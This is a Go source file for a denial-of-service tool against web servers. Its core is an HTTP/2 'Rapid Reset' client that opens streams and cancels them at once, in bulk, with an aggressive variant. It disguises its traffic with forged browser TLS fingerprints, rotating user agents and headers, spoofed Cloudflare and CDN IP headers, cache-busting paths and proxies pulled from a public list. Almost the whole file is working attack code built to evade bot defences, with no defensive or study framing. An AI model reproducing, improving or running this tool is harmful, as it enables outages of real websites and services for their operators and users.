package main

import (
	"bytes"
	"context"
	"crypto/rand"
	"crypto/tls"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"math/big"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	utls "github.com/refraction-networking/utls"
	"golang.org/x/net/http2"
	"golang.org/x/net/http2/hpack"
)

var (
	userAgents = []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/120.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 13.5; rv:109.0) Gecko/20100101 Firefox/120.0",
		"Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/120.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
		"Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
		"facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)",
		"Twitterbot/1.0",
	}
	referers = []string{
		"https://www.google.com/",
		"https://www.bing.com/",
		"https://duckduckgo.com/",
		"https://facebook.com/",
		"https://www.reddit.com/",
		"https://www.youtube.com/",
		"https://www.linkedin.com/",
		"https://www.instagram.com/",
		"https://www.tiktok.com/",
		"https://discord.com/",
		"https://web.whatsapp.com/",
		"https://mail.google.com/",
		"https://drive.google.com/",
		"https://github.com/",
		"https://stackoverflow.com/",
		"https://www.amazon.com/",
		"",
	}

	acceptLanguages = []string{
		"en-US,en;q=0.9",
		"en-GB,en;q=0.8",
		"fr-FR,fr;q=0.9,en;q=0.8",
		"de-DE,de;q=0.9,en;q=0.8",
		"es-ES,es;q=0.9,en;q=0.8",
		"pt-BR,pt;q=0.9,en;q=0.8",
		"it-IT,it;q=0.9,en;q=0.8",
		"ja-JP,ja;q=0.9,en;q=0.8",
		"ko-KR,ko;q=0.9,en;q=0.8",
		"zh-CN,zh;q=0.9,en;q=0.8",
		"ru-RU,ru;q=0.9,en;q=0.8",
	}

	acceptHeaders = []string{
		"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
		"application/json, text/plain, */*",
		"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
		"*/*",
		"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
		"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
	}

	acceptEncodings = []string{
		"gzip, deflate, br",
		"gzip, deflate",
		"identity",
		"gzip;q=1.0, deflate;q=0.9, br;q=0.8",
		"*;q=0.1",
	}

	cacheControls = []string{
		"no-cache",
		"no-store",
		"must-revalidate",
		"max-age=0",
		"private",
		"public",
		"no-transform",
		"proxy-revalidate",
		"s-maxage=0",
	}

	securityHeaders = []map[string]string{
		{"X-Content-Type-Options": "nosniff"},
		{"X-Frame-Options": "DENY"},
		{"X-Frame-Options": "SAMEORIGIN"},
		{"X-XSS-Protection": "1; mode=block"},
		{"Strict-Transport-Security": "max-age=31536000; includeSubDomains"},
		{"Referrer-Policy": "no-referrer"},
		{"Referrer-Policy": "strict-origin-when-cross-origin"},
		{"Referrer-Policy": "same-origin"},
	}

	modernHeaders = []map[string]string{
		{"Sec-Fetch-Dest": "document"},
		{"Sec-Fetch-Dest": "empty"},
		{"Sec-Fetch-Dest": "script"},
		{"Sec-Fetch-Dest": "style"},
		{"Sec-Fetch-Dest": "image"},
		{"Sec-Fetch-Dest": "font"},
		{"Sec-Fetch-Dest": "worker"},
		{"Sec-Fetch-Mode": "navigate"},
		{"Sec-Fetch-Mode": "cors"},
		{"Sec-Fetch-Mode": "no-cors"},
		{"Sec-Fetch-Mode": "same-origin"},
		{"Sec-Fetch-Site": "same-origin"},
		{"Sec-Fetch-Site": "cross-site"},
		{"Sec-Fetch-Site": "none"},
		{"Sec-Fetch-User": "?1"},
		{"Upgrade-Insecure-Requests": "1"},
		{"DNT": "0"},
		{"DNT": "1"},
	}

	cloudflareIPRanges = [][]string{
		{"173.245.48", "173.245.63"},
		{"103.21.244", "103.21.247"},
		{"141.101.64", "141.101.127"},
		{"108.162.192", "108.162.255"},
		{"104.16.0", "104.23.255"},
		{"172.64.0", "172.71.255"},
	}

	cloudflareHeaders = []map[string]string{
		{"CF-Connecting-IP": ""},
		{"CF-IPCountry": "US"},
		{"CF-IPCountry": "GB"},
		{"CF-IPCountry": "DE"},
		{"CF-IPCountry": "FR"},
		{"CF-IPCountry": "CA"},
		{"CF-IPCountry": "AU"},
		{"CF-IPCountry": "JP"},
		{"CF-IPCountry": "SG"},
		{"True-Client-IP": ""},
	}

	hetznerHeaders = []map[string]string{
		{"X-Client-IP": ""},
		{"X-Cluster-Client-IP": ""},
		{"X-Hetzner-DataCenter": "FSN1-DC1"},
	}

	digitaloceanHeaders = []map[string]string{
		{"X-Forwarded-Host": ""},
		{"X-Forwarded-Port": "80"},
		{"X-Forwarded-Port": "443"},
		{"X-Forwarded-Port": "8080"},
	}

	awsHeaders = []map[string]string{
		{"X-Amz-Cf-Id": ""},
		{"X-Amz-Cf-Pop": "DFW"},
		{"X-Amz-Cf-Pop": "LHR"},
		{"X-Amz-Cf-Pop": "SIN"},
		{"X-Amz-Cf-Pop": "NRT"},
		{"X-Amz-Cf-Pop": "SYD"},
		{"Via": "1.1 amazon.cloudfront.net"},
	}

	cdnHeaders = []map[string]string{
		{"X-CDN": "Cloudflare"},
		{"X-CDN": "Akamai"},
		{"X-CDN": "Fastly"},
		{"X-CDN": "CloudFront"},
		{"X-CDN": "MaxCDN"},
		{"X-Edge-Location": "DFW"},
		{"X-Edge-Location": "LHR"},
		{"X-Edge-Location": "SIN"},
		{"X-Edge-Location": "NRT"},
		{"X-Edge-Location": "SYD"},
		{"X-Edge-Location": "GRU"},
		{"Via": "1.1 varnish"},
		{"X-Cache": "MISS"},
		{"X-Cache": "HIT"},
	}

	appHeaders = []map[string]string{
		{"X-Requested-With": "XMLHttpRequest"},
		{"X-Requested-With": "Fetch"},
		{"X-CSRF-Token": ""},
		{"Authorization": "Bearer "},
		{"X-API-Key": ""},
		{"X-Device-ID": ""},
		{"X-Session-ID": ""},
	}

	proxies         []string
	proxyMu         sync.RWMutex
	proxyIndex      uint64
	proxyAPI        = "https://api.proxyscrape.com/v4/free-proxy-list/get?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all&skip=0&limit=2000"
	refreshInterval = 5 * time.Minute
	colorIndex      = 0
	colorMu         sync.Mutex
)

type JA3Signature struct {
	Name             string
	CipherSuites     []uint16
	CurvePreferences []tls.CurveID
	NextProtos       []string
	MinVersion       uint16
	MaxVersion       uint16
}

var ja3Signatures = []JA3Signature{
	{
		Name: "Chrome 120",
		CipherSuites: []uint16{
			tls.TLS_AES_128_GCM_SHA256,
			tls.TLS_AES_256_GCM_SHA384,
			tls.TLS_CHACHA20_POLY1305_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256,
			tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
		},
		CurvePreferences: []tls.CurveID{tls.X25519, tls.CurveP256, tls.CurveP384},
		NextProtos:       []string{"h2", "http/1.1"},
		MinVersion:       tls.VersionTLS12,
		MaxVersion:       tls.VersionTLS13,
	},
	{
		Name: "Firefox 120",
		CipherSuites: []uint16{
			tls.TLS_AES_128_GCM_SHA256,
			tls.TLS_CHACHA20_POLY1305_SHA256,
			tls.TLS_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256,
			tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
		},
		CurvePreferences: []tls.CurveID{tls.X25519, tls.CurveP256, tls.CurveP384, tls.CurveP521},
		NextProtos:       []string{"h2", "http/1.1"},
		MinVersion:       tls.VersionTLS12,
		MaxVersion:       tls.VersionTLS13,
	},
	{
		Name: "Safari 17",
		CipherSuites: []uint16{
			tls.TLS_AES_128_GCM_SHA256,
			tls.TLS_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256,
		},
		CurvePreferences: []tls.CurveID{tls.X25519, tls.CurveP256, tls.CurveP384},
		NextProtos:       []string{"h2", "http/1.1"},
		MinVersion:       tls.VersionTLS12,
		MaxVersion:       tls.VersionTLS13,
	},
	{
		Name: "Edge 120",
		CipherSuites: []uint16{
			tls.TLS_AES_128_GCM_SHA256,
			tls.TLS_AES_256_GCM_SHA384,
			tls.TLS_CHACHA20_POLY1305_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
		},
		CurvePreferences: []tls.CurveID{tls.X25519, tls.CurveP256, tls.CurveP384},
		NextProtos:       []string{"h2", "http/1.1"},
		MinVersion:       tls.VersionTLS12,
		MaxVersion:       tls.VersionTLS13,
	},
	{
		Name: "iOS Safari",
		CipherSuites: []uint16{
			tls.TLS_AES_128_GCM_SHA256,
			tls.TLS_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
		},
		CurvePreferences: []tls.CurveID{tls.X25519, tls.CurveP256},
		NextProtos:       []string{"h2", "http/1.1"},
		MinVersion:       tls.VersionTLS12,
		MaxVersion:       tls.VersionTLS13,
	},
	{
		Name: "Android Chrome",
		CipherSuites: []uint16{
			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
		},
		CurvePreferences: []tls.CurveID{tls.CurveP256, tls.CurveP384},
		NextProtos:       []string{"http/1.1"},
		MinVersion:       tls.VersionTLS12,
		MaxVersion:       tls.VersionTLS12,
	},
}

type ConnectionPool struct {
	clients    []*http.Client
	counter    uint64
	mu         sync.RWMutex
	size       int
	useProxy   bool
	targetHost string
}

type RapidResetClient struct {
	conn           net.Conn
	tlsConn        *utls.UConn
	framer         *http2.Framer
	hpackEncoder   *hpack.Encoder
	hpackBuf       bytes.Buffer
	nextStreamID   uint32
	closed         bool
	host           string
	port           string
	settingsAcked  bool
	maxStreams     uint32
	goAwayReceived bool
}

var chromeH2Settings = []http2.Setting{
	{ID: http2.SettingHeaderTableSize, Val: 65536},
	{ID: http2.SettingEnablePush, Val: 0},
	{ID: http2.SettingInitialWindowSize, Val: 6291456},
	{ID: http2.SettingMaxHeaderListSize, Val: 262144},
}

func chromeJA3ID(sig JA3Signature) utls.ClientHelloID {
	switch sig.Name {
	case "Chrome 120":
		return utls.HelloChrome_120
	case "Firefox 120":
		return utls.HelloFirefox_120
	case "Safari 17":
		return utls.HelloSafari_16_0
	case "Edge 120":
		return utls.HelloEdge_106
	case "iOS Safari":
		return utls.HelloIOS_14
	case "Android Chrome":
		return utls.HelloAndroid_11_OkHttp
	default:
		return utls.HelloChrome_120
	}
}

func newUTLSConn(host, port string, sig JA3Signature) (*utls.UConn, error) {
	rawConn, err := net.DialTimeout("tcp", net.JoinHostPort(host, port), 10*time.Second)
	if err != nil {
		return nil, err
	}
	cfg := &utls.Config{
		ServerName:         host,
		InsecureSkipVerify: true,
		NextProtos:         sig.NextProtos,
		MinVersion:         sig.MinVersion,
		MaxVersion:         sig.MaxVersion,
	}
	uconn := utls.UClient(rawConn, cfg, chromeJA3ID(sig))
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()
	if err := uconn.HandshakeContext(ctx); err != nil {
		rawConn.Close()
		return nil, err
	}
	return uconn, nil
}

func NewRapidResetClient(host, port string, sig JA3Signature) (*RapidResetClient, error) {
	client := &RapidResetClient{
		host:         host,
		port:         port,
		nextStreamID: 1,
		maxStreams:   100,
	}
	uconn, err := newUTLSConn(host, port, sig)
	if err != nil {
		return nil, fmt.Errorf("utls dial failed: %v", err)
	}
	client.tlsConn = uconn
	client.conn = uconn

	preface := []byte("PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n")
	if _, err := client.conn.Write(preface); err != nil {
		client.conn.Close()
		return nil, fmt.Errorf("preface write failed: %v", err)
	}
	client.framer = http2.NewFramer(client.conn, client.conn)
	client.hpackEncoder = hpack.NewEncoder(&client.hpackBuf)

	if err := client.framer.WriteSettings(chromeH2Settings...); err != nil {
		client.conn.Close()
		return nil, fmt.Errorf("write settings failed: %v", err)
	}

	client.conn.SetReadDeadline(time.Now().Add(5 * time.Second))
	for {
		frame, err := client.framer.ReadFrame()
		if err != nil {
			client.conn.Close()
			return nil, fmt.Errorf("read settings ack failed: %v", err)
		}
		if sf, ok := frame.(*http2.SettingsFrame); ok && !sf.IsAck() {
			sf.ForeachSetting(func(s http2.Setting) error {
				if s.ID == http2.SettingMaxConcurrentStreams {
					client.maxStreams = s.Val
				}
				return nil
			})
			if err := client.framer.WriteSettingsAck(); err != nil {
				client.conn.Close()
				return nil, fmt.Errorf("write settings ack failed: %v", err)
			}
			continue
		}
		if sf, ok := frame.(*http2.SettingsFrame); ok && sf.IsAck() {
			client.settingsAcked = true
			break
		}
	}
	client.conn.SetReadDeadline(time.Time{})
	if client.maxStreams == 0 {
		client.maxStreams = 100
	}
	return client, nil
}

func (c *RapidResetClient) encodeHeaders(headers []hpack.HeaderField) []byte {
	c.hpackBuf.Reset()
	for _, hf := range headers {
		c.hpackEncoder.WriteField(hf)
	}
	return c.hpackBuf.Bytes()
}

func (c *RapidResetClient) SendRequestAndReset(path string) error {
	if c.closed || c.goAwayReceived {
		return fmt.Errorf("connection closed")
	}
	streamID := c.nextStreamID
	c.nextStreamID += 2
	headers := []hpack.HeaderField{
		{Name: ":method", Value: "GET"},
		{Name: ":path", Value: path},
		{Name: ":scheme", Value: "https"},
		{Name: ":authority", Value: c.host},
		{Name: "user-agent", Value: randomUA()},
		{Name: "accept", Value: acceptHeaders[0]},
		{Name: "accept-language", Value: "en-US,en;q=0.9"},
		{Name: "sec-fetch-site", Value: "none"},
		{Name: "sec-fetch-mode", Value: "navigate"},
		{Name: "sec-fetch-dest", Value: "document"},
		{Name: "sec-ch-ua", Value: `"Chromium";v="120", "Not_A Brand";v="8"`},
		{Name: "sec-ch-ua-mobile", Value: "?0"},
		{Name: "sec-ch-ua-platform", Value: `"Windows"`},
	}
	if randBool() {
		headers = append(headers, hpack.HeaderField{Name: "cache-control", Value: "no-cache"})
	}
	headerBlock := c.encodeHeaders(headers)
	if err := c.framer.WriteHeaders(http2.HeadersFrameParam{
		StreamID:      streamID,
		BlockFragment: headerBlock,
		EndStream:     false,
		EndHeaders:    true,
	}); err != nil {
		return err
	}
	if err := c.framer.WriteRSTStream(streamID, http2.ErrCodeCancel); err != nil {
		return err
	}
	return nil
}

func (c *RapidResetClient) drainServerFrames() {
	c.conn.SetReadDeadline(time.Now().Add(50 * time.Millisecond))
	defer c.conn.SetReadDeadline(time.Time{})
	for {
		frame, err := c.framer.ReadFrame()
		if err != nil {
			return
		}
		switch f := frame.(type) {
		case *http2.GoAwayFrame:
			c.goAwayReceived = true
			c.closed = true
			return
		case *http2.RSTStreamFrame:
			_ = f
		case *http2.PingFrame:
			if !f.IsAck() {
				c.framer.WritePing(true, f.Data)
			}
		case *http2.SettingsFrame:
			if !f.IsAck() {
				c.framer.WriteSettingsAck()
			}
		}
	}
}

func (c *RapidResetClient) SendMultipleResets(count int, path string) int {
	success := 0
	for i := 0; i < count; i++ {
		if c.closed || c.goAwayReceived {
			break
		}
		if err := c.SendRequestAndReset(path); err != nil {
			c.closed = true
			break
		}
		success++
		if success%50 == 0 {
			c.drainServerFrames()
		}
	}
	c.drainServerFrames()
	return success
}

func (c *RapidResetClient) Close() {
	if c.closed {
		if c.conn != nil {
			c.conn.Close()
		}
		return
	}
	c.closed = true
	if c.conn != nil {
		c.framer.WriteGoAway(0, http2.ErrCodeNo, []byte{})
		c.conn.Close()
	}
}

func getRandomJA3Signature() JA3Signature {
	return ja3Signatures[randInt(0, len(ja3Signatures)-1)]
}

func utlsRoundTripper(proxyURL *url.URL, sig JA3Signature) http.RoundTripper {
	dialer := &net.Dialer{Timeout: 10 * time.Second, KeepAlive: 30 * time.Second}
	dialTLS := func(ctx context.Context, network, addr string) (net.Conn, error) {
		host, port, err := net.SplitHostPort(addr)
		if err != nil {
			return nil, err
		}
		var rawConn net.Conn
		if proxyURL != nil {
			rawConn, err = dialer.DialContext(ctx, "tcp", proxyURL.Host)
			if err != nil {
				return nil, err
			}
			connectReq := fmt.Sprintf("CONNECT %s:%s HTTP/1.1\r\nHost: %s:%s\r\n\r\n", host, port, host, port)
			if _, err := rawConn.Write([]byte(connectReq)); err != nil {
				rawConn.Close()
				return nil, err
			}
			buf := make([]byte, 1024)
			n, err := rawConn.Read(buf)
			if err != nil {
				rawConn.Close()
				return nil, err
			}
			if !bytes.Contains(buf[:n], []byte("200")) {
				rawConn.Close()
				return nil, fmt.Errorf("proxy CONNECT failed")
			}
		} else {
			rawConn, err = dialer.DialContext(ctx, network, addr)
			if err != nil {
				return nil, err
			}
		}
		cfg := &utls.Config{ServerName: host, InsecureSkipVerify: true, NextProtos: sig.NextProtos}
		uconn := utls.UClient(rawConn, cfg, chromeJA3ID(sig))
		hsCtx, hsCancel := context.WithTimeout(ctx, 10*time.Second)
		defer hsCancel()
		if err := uconn.HandshakeContext(hsCtx); err != nil {
			rawConn.Close()
			return nil, err
		}
		return uconn, nil
	}
	proto := "http/1.1"
	for _, p := range sig.NextProtos {
		if p == "h2" {
			proto = "h2"
			break
		}
	}
	if proto == "h2" {
		return &http2.Transport{
			DialTLSContext: func(ctx context.Context, network, addr string, _ *tls.Config) (net.Conn, error) {
				return dialTLS(ctx, network, addr)
			},
		}
	}
	return &http.Transport{
		Proxy: func(req *http.Request) (*url.URL, error) {
			if proxyURL == nil {
				return nil, nil
			}
			return proxyURL, nil
		},
		DialTLSContext:      dialTLS,
		MaxIdleConns:        100,
		MaxIdleConnsPerHost: 100,
		IdleConnTimeout:     120 * time.Second,
	}
}

func NewConnectionPool(poolSize int, useProxy bool, targetHost string) *ConnectionPool {
	pool := &ConnectionPool{
		clients:    make([]*http.Client, poolSize),
		size:       poolSize,
		useProxy:   useProxy,
		targetHost: targetHost,
	}
	fmt.Printf("[+] Creating connection pool with %d connections (utls JA3 per client)...\n", poolSize)
	for i := 0; i < poolSize; i++ {
		pool.clients[i] = pool.createClient()
		if (i+1)%100 == 0 {
			fmt.Printf("[+] Created %d/%d connections...\n", i+1, poolSize)
		}
	}
	fmt.Printf("[+] Connection pool ready! %d unique TLS fingerprints\n", poolSize)
	return pool
}

func (p *ConnectionPool) createClient() *http.Client {
	if p.useProxy {
		proxyStr := getNextProxy()
		if proxyStr == "" {
			return nil
		}
		if !strings.Contains(proxyStr, "://") {
			proxyStr = "http://" + proxyStr
		}
		proxyURL, err := url.Parse(proxyStr)
		if err != nil {
			return nil
		}
		sig := getRandomJA3Signature()
		rt := utlsRoundTripper(proxyURL, sig)
		return &http.Client{Transport: rt, Timeout: 30 * time.Second}
	}
	sig := getRandomJA3Signature()
	rt := utlsRoundTripper(nil, sig)
	return &http.Client{Transport: rt, Timeout: 30 * time.Second}
}

func (p *ConnectionPool) GetClient() *http.Client {
	for i := 0; i < p.size; i++ {
		idx := atomic.AddUint64(&p.counter, 1) % uint64(p.size)
		c := p.clients[idx]
		if c != nil {
			return c
		}
	}
	return nil
}

func (p *ConnectionPool) CloseIdleConnections() {
	for _, client := range p.clients {
		if client == nil {
			continue
		}
		switch tr := client.Transport.(type) {
		case *http.Transport:
			tr.CloseIdleConnections()
		case *http2.Transport:
			_ = tr
		}
	}
}

func detectProtocols(target string) []string {
	u, err := url.Parse(target)
	if err != nil {
		return []string{"h1"}
	}
	host := u.Hostname()
	port := u.Port()
	if port == "" {
		if u.Scheme == "https" {
			port = "443"
		} else {
			port = "80"
		}
	}
	detected := make(map[string]bool)
	if u.Scheme == "https" {
		rawConn, err := net.DialTimeout("tcp", net.JoinHostPort(host, port), 5*time.Second)
		if err == nil {
			cfg := &utls.Config{ServerName: host, InsecureSkipVerify: true, NextProtos: []string{"h2", "http/1.1"}}
			uconn := utls.UClient(rawConn, cfg, utls.HelloChrome_120)
			ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
			if err := uconn.HandshakeContext(ctx); err == nil {
				if uconn.ConnectionState().NegotiatedProtocol == "h2" {
					detected["h2"] = true
				} else {
					detected["h1"] = true
				}
			}
			cancel()
			uconn.Close()
		}
	}
	client := &http.Client{
		Timeout: 5 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},
			ForceAttemptHTTP2: true,
		},
	}
	req, _ := http.NewRequest("HEAD", target, nil)
	resp, err := client.Do(req)
	if err == nil {
		if resp.Body != nil {
			resp.Body.Close()
		}
		if resp.ProtoMajor == 2 {
			detected["h2"] = true
		} else {
			detected["h1"] = true
		}
		altSvc := resp.Header.Get("Alt-Svc")
		if strings.Contains(altSvc, "h3") {
			detected["h3"] = true
		}
	}
	if len(detected) == 0 {
		detected["h1"] = true
	}
	result := make([]string, 0, len(detected))
	for proto := range detected {
		result = append(result, proto)
	}
	return result
}

func rapidResetWorker(targetURL string, done chan struct{}, stats *atomicCounter) {
	u, err := url.Parse(targetURL)
	if err != nil {
		return
	}
	host := u.Hostname()
	port := u.Port()
	if port == "" {
		if u.Scheme == "https" {
			port = "443"
		} else {
			port = "80"
		}
	}
	var client *RapidResetClient
	connect := func() bool {
		if client != nil {
			client.Close()
			client = nil
		}
		sig := getRandomJA3Signature()
		c, err := NewRapidResetClient(host, port, sig)
		if err != nil {
			time.Sleep(time.Duration(randInt(200, 800)) * time.Millisecond)
			return false
		}
		client = c
		return true
	}
	for {
		select {
		case <-done:
			if client != nil {
				client.Close()
			}
			return
		default:
			if client == nil || client.closed || client.goAwayReceived {
				if !connect() {
					continue
				}
			}
			path := generateAdvancedPath()
			if strings.Contains(path, "?") {
				path += "&" + generateCacheBustParams()[1:]
			} else {
				path += generateCacheBustParams()
			}
			maxPer := int(client.maxStreams)
			if maxPer < 50 {
				maxPer = 50
			}
			if maxPer > 200 {
				maxPer = 200
			}
			streams := randInt(maxPer/2, maxPer)
			success := client.SendMultipleResets(streams, path)
			for i := 0; i < success; i++ {
				stats.inc()
			}
			if client.closed || client.goAwayReceived {
				client.Close()
				client = nil
			}
			time.Sleep(time.Duration(randInt(20, 80)) * time.Millisecond)
		}
	}
}

func rapidResetWorkerAggressive(targetURL string, done chan struct{}, stats *atomicCounter) {
	u, err := url.Parse(targetURL)
	if err != nil {
		return
	}
	host := u.Hostname()
	port := u.Port()
	if port == "" {
		if u.Scheme == "https" {
			port = "443"
		} else {
			port = "80"
		}
	}
	var client *RapidResetClient
	connect := func() bool {
		if client != nil {
			client.Close()
			client = nil
		}
		sig := getRandomJA3Signature()
		c, err := NewRapidResetClient(host, port, sig)
		if err != nil {
			return false
		}
		client = c
		return true
	}
	for {
		select {
		case <-done:
			if client != nil {
				client.Close()
			}
			return
		default:
			if client == nil || client.closed || client.goAwayReceived {
				if !connect() {
					continue
				}
			}
			path := "/" + randomString(randInt(5, 15))
			limit := int(client.maxStreams)
			if limit < 50 {
				limit = 50
			}
			if limit > 500 {
				limit = 500
			}
			for i := 0; i < limit; i++ {
				select {
				case <-done:
					client.Close()
					return
				default:
					if client.closed || client.goAwayReceived {
						break
					}
					if err := client.SendRequestAndReset(path); err != nil {
						break
					}
					stats.inc()
				}
			}
			client.drainServerFrames()
			if client.closed || client.goAwayReceived {
				client.Close()
				client = nil
			}
		}
	}
}

func loadProxiesFromAPI() {
	resp, err := http.Get(proxyAPI)
	if err != nil {
		fmt.Printf("[-] Error fetching proxies: %v\n", err)
		return
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		fmt.Printf("[-] ProxyScrape returned %d\n", resp.StatusCode)
		return
	}
	body, _ := io.ReadAll(resp.Body)
	lines := strings.Split(string(body), "\n")
	newProxies := []string{}
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line != "" && strings.Contains(line, ":") && !strings.HasPrefix(line, "#") {
			newProxies = append(newProxies, line)
		}
	}
	proxyMu.Lock()
	proxies = newProxies
	proxyMu.Unlock()
	atomic.StoreUint64(&proxyIndex, 0)
	fmt.Printf("[+] Loaded/Refreshed %d proxies from ProxyScrape\n", len(proxies))
}

func proxyRefresher() {
	ticker := time.NewTicker(refreshInterval)
	defer ticker.Stop()
	for range ticker.C {
		loadProxiesFromAPI()
	}
}

func getNextProxy() string {
	proxyMu.RLock()
	n := len(proxies)
	if n == 0 {
		proxyMu.RUnlock()
		return ""
	}
	idx := atomic.AddUint64(&proxyIndex, 1) % uint64(n)
	p := proxies[idx]
	proxyMu.RUnlock()
	return p
}

func getNextColor() string {
	colorMu.Lock()
	defer colorMu.Unlock()
	colors := []string{
		"\033[32m",
		"\033[31m",
		"\033[35m",
		"\033[37m",
		"\033[33m",
		"\033[36m",
		"\033[34m",
	}
	color := colors[colorIndex]
	colorIndex = (colorIndex + 1) % len(colors)
	return color
}

func printBanner() {
	color := getNextColor()
	fmt.Print(color)
	fmt.Println(" ::::'######::::'#######::::: ")
	fmt.Println(" :::'##... ##::'##.... ##:::: ")
	fmt.Println(" ::: ##:::..::: ##:::: ##:::: ")
	fmt.Println(" ::: ##::'####: ##:::: ##:::: ")
	fmt.Println(" ::: ##::: ##:: ##:::: ##:::: ")
	fmt.Println(" ::: ##::: ##:: ##:::: ##:::: ")
	fmt.Println(" :::. ######:::. #######::::: ")
	fmt.Println(" ::::......:::::.......:::::: ")
	fmt.Println("\033[0m")
}

func generateCloudflareIP() string {
	cfRange := cloudflareIPRanges[randInt(0, len(cloudflareIPRanges)-1)]
	start := net.ParseIP(cfRange[0] + ".0").To4()
	end := net.ParseIP(cfRange[1] + ".255").To4()
	if start == nil || end == nil {
		return "104.16.0.1"
	}
	startU := uint32(start[0])<<24 | uint32(start[1])<<16 | uint32(start[2])<<8 | uint32(start[3])
	endU := uint32(end[0])<<24 | uint32(end[1])<<16 | uint32(end[2])<<8 | uint32(end[3])
	if endU <= startU {
		return "104.16.0.1"
	}
	off := uint32(randInt(1, int(endU-startU-1)))
	ip := startU + off
	return fmt.Sprintf("%d.%d.%d.%d", byte(ip>>24), byte(ip>>16), byte(ip>>8), byte(ip))
}

func randomHex(n int) string {
	bytes := make([]byte, n)
	rand.Read(bytes)
	return hex.EncodeToString(bytes)
}

func randomBase64(n int) string {
	bytes := make([]byte, n)
	rand.Read(bytes)
	return base64.StdEncoding.EncodeToString(bytes)
}

